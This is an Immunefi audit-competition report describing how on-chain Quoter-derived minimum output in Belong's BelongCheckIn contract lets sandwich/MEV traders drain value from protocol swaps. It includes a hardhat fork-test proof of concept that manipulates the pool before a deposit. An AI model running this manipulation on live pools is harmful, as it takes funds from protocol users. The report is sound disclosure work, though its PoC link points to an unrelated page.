# 57452 sc high on chain quoter reliance and spot price based swaps enable pool manipulation and value extraction from protocol controlled conversions usdc long&#x20;

* Submitted on Oct 26th 2025 at 10:30:44 UTC by @jo13 for [Audit Comp | Belong](https://immunefi.com/audit-competition/audit-comp-belong)
* Report ID: #57452
* Report Type: Smart Contract
* Report severity: High
* Target: <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol>
* Impacts: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

{% hint style="danger" %}
Severity: High — The contract derives min-out from an on-chain Uniswap V3 Quoter at execution time, which is spot-based and manipulable by MEV/sandwich attacks, enabling direct economic loss on protocol-initiated swaps.
{% endhint %}

## Description

### Brief / Intro

The contract derives `amountOutMinimum` from Uniswap V3’s Quoter on-chain at execution time. Because the Quoter returns spot outputs based on current pool state, searchers can manipulate the pool just before inclusion and force a low quote. The swap then executes with a too-low `amountOutMinimum`, causing systematic execution loss on protocol-controlled conversions (USDC ↔ LONG) such as venue fee conversions, AutoConvert payments, and buyback/burn.

## Vulnerability Details

* In `BelongCheckIn._swapExact`, `amountOutMinimum` is computed on-chain from Quoter, which reflects manipulable spot state:

```solidity
// BelongCheckIn.sol::_swapExact
uint256 amountOutMinimum = IV3Quoter(_paymentsInfo.swapV3Quoter)
    .quoteExactInput(path, amount)
    .amountOutMin(_paymentsInfo.slippageBps);
```

* The swap then uses this min-out with `deadline: block.timestamp`:

```solidity
IV3Router.ExactInputParamsV1({
    path: path,
    recipient: recipient,
    deadline: block.timestamp,
    amountIn: amount,
    amountOutMinimum: amountOutMinimum
});
```

* There is no anchor price (TWAP/Chainlink) check, no minimum-liquidity check, and no volatility circuit breaker.
* Affected flows:
  * `venueDeposit` → `_swapUSDCtoLONG` (fees to LONG)
  * `payToVenue` (AutoConvert LONG→USDC)
  * `distributePromoterPayments` (USDC→LONG)
  * `_handleRevenue` buyback (USDC→LONG)

## Attack path (summary)

{% stepper %}
{% step %}
Pre-trade the target pool to worsen the spot price.
{% endstep %}

{% step %}
Victim transaction calls Quoter on-chain and derives a too-low `amountOutMinimum` from the manipulated spot state.
{% endstep %}

{% step %}
Swap executes because actual execution price is above the artificially-low minimum, transferring value to the attacker.
{% endstep %}

{% step %}
Attacker back-runs to unwind and capture profit (sandwich/MEV).
{% endstep %}
{% endstepper %}

## Impact Details

* Direct economic loss on each protocol-initiated swap when spot is manipulated (sandwich/MEV). For example, on a 5% adverse move, a $50k notional swap can lose \~$2.5k. Loss scales with swap size and frequency.
* Severity: High. Routinely exploitable by MEV and persists until quoting is moved off-chain or bounded by an anchor.

## References

* Code: `contracts/v2/platform/BelongCheckIn.sol` (`_swapExact`, `_swapUSDCtoLONG`, `_swapLONGtoUSDC`)
* Uniswap V3 Quoter docs (not recommended for on-chain production min-out derivation)
* General MEV/sandwich references for spot-price manipulation around swaps

## Link to Proof of Concept

<https://developer.metamask.io/>

## Proof of Concept

<details>

<summary>Test: Security: Quoter minOut manipulation (click to expand)</summary>

Add this to `/home/jo/audit-comp-belong/test/v2/platform/belong-check-in-bsc-fork.test.ts` and run: LEDGER\_ADDRESS=0x0000000000000000000000000000000000000001 PK=0x1000000000000000000000000000000000000000000000000000000000000001 npx hardhat test test/v2/platform/belong-check-in-bsc-fork.test.ts --grep "Security: Quoter minOut manipulation"

```js
describe('Security: Quoter minOut manipulation', () => {
  it('pre-trade reduces USDC→CAKE output for venueDeposit()', async () => {
    const {
      belongCheckIn,
      escrow,
      helper,
      signatureVerifier,
      signer,
      USDC,
      CAKE,
      USDC_whale,
    } = await loadFixture(fixture);

    const uri = 'uriuri';
    const amount = await u(100, USDC);
    const venue = USDC_whale.address;
    const message = ethers.utils.solidityKeccak256(
      ['address', 'bytes32', 'string', 'uint256'],
      [venue, ethers.constants.HashZero, uri, chainId],
    );
    const signature = EthCrypto.sign(signer.privateKey, message);

    const venueInfo: VenueInfoStruct = {
      rules: { paymentType: 1, bountyType: 1, longPaymentType: 0 } as VenueRulesStruct,
      venue,
      amount,
      referralCode: ethers.constants.HashZero,
      uri,
      signature,
    };

    const willBeTaken = convenienceFeeAmount.add(amount);
    await USDC.connect(USDC_whale).approve(belongCheckIn.address, willBeTaken);

    const tx1 = await belongCheckIn.connect(USDC_whale).venueDeposit(venueInfo);
    const escrowDeposit1 = await escrow.venueDeposits(USDC_whale.address);
    await expect(tx1).to.emit(belongCheckIn, 'Swapped');
    const baselineLongOut = escrowDeposit1.longDeposits;

    const {
      belongCheckIn: belongCheckIn2,
      escrow: escrow2,
      USDC: USDC2,
      CAKE: CAKE2,
      USDC_whale: USDC_whale2,
    } = await loadFixture(fixture);

    const router = await ethers.getContractAt(
      'contracts/v2/interfaces/IV3Router.sol:IV3Router',
      PANCAKESWAP_ROUTER_ADDRESS,
    );

    const whaleBal = await USDC2.balanceOf(USDC_whale2.address);
    const attackAmount = whaleBal.div(3);
    await USDC2.connect(USDC_whale2).approve(PANCAKESWAP_ROUTER_ADDRESS, attackAmount);
    const { timestamp } = await ethers.provider.getBlock('latest');

    const directPath = ethers.utils.solidityPack(
      ['address', 'uint24', 'address'],
      [USDC_ADDRESS, POOL_FEE, CAKE_ADDRESS],
    );
    const viaWbnbPath = ethers.utils.solidityPack(
      ['address', 'uint24', 'address', 'uint24', 'address'],
      [USDC_ADDRESS, POOL_FEE, WBNB_ADDRESS, POOL_FEE, CAKE_ADDRESS],
    );

    try {
      const txAttack = await router
        .connect(USDC_whale2)
        ['exactInput((bytes,address,uint256,uint256,uint256))']({
          path: directPath,
          recipient: USDC_whale2.address,
          deadline: timestamp + 3600,
          amountIn: attackAmount,
          amountOutMinimum: 0,
        });
      await txAttack.wait();
    } catch {
      try {
        const txAttack2 = await router
          .connect(USDC_whale2)
          ['exactInput((bytes,address,uint256,uint256,uint256))']({
            path: viaWbnbPath,
            recipient: USDC_whale2.address,
            deadline: timestamp + 3600,
            amountIn: attackAmount,
            amountOutMinimum: 0,
          });
        await txAttack2.wait();
      } catch {
        try {
          const txAttack3 = await router
            .connect(USDC_whale2)
            ['exactInput((bytes,address,uint256,uint256))']({
              path: directPath,
              recipient: USDC_whale2.address,
              amountIn: attackAmount,
              amountOutMinimum: 0,
            });
          await txAttack3.wait();
        } catch {
          const txAttack4 = await router
            .connect(USDC_whale2)
            ['exactInput((bytes,address,uint256,uint256))']({
              path: viaWbnbPath,
              recipient: USDC_whale2.address,
              amountIn: attackAmount,
              amountOutMinimum: 0,
            });
          await txAttack4.wait();
        }
      }
    }

    await USDC2.connect(USDC_whale2).approve(belongCheckIn2.address, willBeTaken);
    const tx2 = await belongCheckIn2.connect(USDC_whale2).venueDeposit(venueInfo);
    const escrowDeposit2 = await escrow2.venueDeposits(USDC_whale2.address);
    await expect(tx2).to.emit(belongCheckIn2, 'Swapped');

    expect(escrowDeposit2.longDeposits).to.be.lt(baselineLongOut);
  });
});
```

</details>

***

If you want, I can propose specific remediations (e.g., using TWAP/Chainlink anchoring, off-chain quoting, adding min-liquidity checks, volatility circuit breakers, or delaying quoting) and example code patches for `BelongCheckIn._swapExact`. Which would you prefer?
